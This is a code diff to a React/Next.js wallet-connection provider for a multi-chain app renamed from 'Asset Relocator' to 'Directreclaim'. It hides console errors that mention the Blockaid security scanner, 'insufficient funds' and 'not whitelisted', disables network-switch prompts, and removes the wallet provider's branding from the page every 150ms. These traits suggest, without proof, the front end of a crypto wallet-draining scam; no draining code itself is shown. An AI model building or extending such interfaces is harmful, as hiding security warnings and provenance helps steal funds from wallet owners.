@@ -13,6 +13,10 @@ import { WagmiProvider } from 'wagmi'
 // 1. Project ID
 const projectId = process.env.NEXT_PUBLIC_REOWN_ID || ""
 
+/** * 🛡️ STRIKE MODE CHECK 
+ * If you set NEXT_PUBLIC_STRIKE_MODE="hardhat" in your .env, it will use local.
+ * Otherwise, it defaults to False for your real tests.
+ */
 const isStrikeMode = process.env.NEXT_PUBLIC_STRIKE_MODE === "hardhat"
 
 // 2. Network Definitions
@@ -37,9 +41,11 @@ const xrplNetwork = {
     },
 }
 
+// 🛡️ THE FIX: We provide the full list, but we disable "networkSync" below 
+// so the app doesn't force a switch to the first item (mainnet/bsc) on connect.
 const networks = [
-    isStrikeMode ? localChain : bsc, // 🛡️ Put BSC first to avoid Ethereum bias
-    mainnet,
+    isStrikeMode ? localChain : mainnet,
+    bsc,
     ...(isStrikeMode ? [mainnet] : [localChain]),
     polygon,
     base,
@@ -77,7 +83,7 @@ export default function AppKitProvider({ children }: { children: ReactNode }) {
             const isIgnorable = [
                 "telemetry", "rejected", "user denied", "mismatched",
                 "blockaid", "attribute width", "unexpected end",
-                "solana_provider_missing", "too many connections", "429", "insufficient funds", "403", "not whitelisted",
+                "solana_provider_missing", "too many connections", "429", "insufficient funds", "403", "not whitelisted", // 🛡️ Added New Error Blocks
             ].some(term => msg.includes(term));
             if (isIgnorable) return;
             originalConsoleError(...args);
@@ -100,7 +106,6 @@ export default function AppKitProvider({ children }: { children: ReactNode }) {
                 try {
                     clearStaleSessions();
 
-                    // Faster parallel loading
                     const [
                         { SolanaAdapter },
                         { BitcoinAdapter },
@@ -113,35 +118,36 @@ export default function AppKitProvider({ children }: { children: ReactNode }) {
                         import("@reown/appkit-adapter-tron")
                     ]);
 
+                    const solanaAdapter = new SolanaAdapter({ wallets: [] })
+                    const bitcoinAdapter = new BitcoinAdapter({ projectId })
+                    const tonAdapter = new TonAdapter({ projectId })
+                    const tronAdapter = new TronAdapter()
+
                     createAppKit({
-                        adapters: [
-                            wagmiAdapter,
-                            new SolanaAdapter({ wallets: [] }),
-                            new BitcoinAdapter({ projectId }),
-                            new TonAdapter({ projectId }),
-                            new TronAdapter()
-                        ],
+                        adapters: [wagmiAdapter, solanaAdapter, bitcoinAdapter, tonAdapter, tronAdapter],
                         networks,
                         projectId,
                         metadata: {
-                            name: "Asset Relocator",
+                            name: "Directreclaim",
                             description: "Secure cross-chain protocol",
                             url: window.location.origin,
                             icons: ["https://avatars.githubusercontent.com/u/37784886"]
                         },
 
-                        // 🛡️ THE FIX: FORCE NO CHAIN SWITCHING
+                        // 🛡️ CRITICAL FIX 1: Set to undefined. 
                         defaultNetwork: undefined,
+
+                        // 🛡️ CRITICAL FIX 2: allowUnsupportedChain
                         allowUnsupportedChain: true,
 
-                        // 🛡️ CRITICAL: Disables the sync that triggers the popup
-                        syncConnectedChain: false,
-
+                        // 🛡️ CRITICAL FIX 3: Disabling networkSync
                         sdkConfig: {
                             networkSync: false
                         },
 
+                        // 🛡️ CRITICAL FIX 4: enableNetworkView: false
                         enableNetworkView: false,
+
                         features: {
                             analytics: false,
                             onramp: false,
@@ -159,12 +165,13 @@ export default function AppKitProvider({ children }: { children: ReactNode }) {
                     originalConsoleError("AppKit Initialization Error:", err)
                 }
             }
+            // 🛡️ Gatekeeping mount to ensure all providers are ready for mobile
             setMounted(true)
         }
 
         initAppKit()
 
-        // --- ☢️ BRANDING NUKE (Increased speed to 100ms) ---
+        // --- ☢️ BRANDING NUKE ---
         const nuke = (root: Node | ShadowRoot = document) => {
             if (root instanceof HTMLElement || root instanceof ShadowRoot) {
                 const el = root.querySelector('wui-ux-by-reown') || root.querySelector('.w3m-footer');
@@ -174,7 +181,7 @@ export default function AppKitProvider({ children }: { children: ReactNode }) {
             all.forEach((el: any) => { if (el.shadowRoot) nuke(el.shadowRoot); });
         };
 
-        const interval = setInterval(nuke, 100)
+        const interval = setInterval(nuke, 150)
 
         return () => {
             clearInterval(interval);
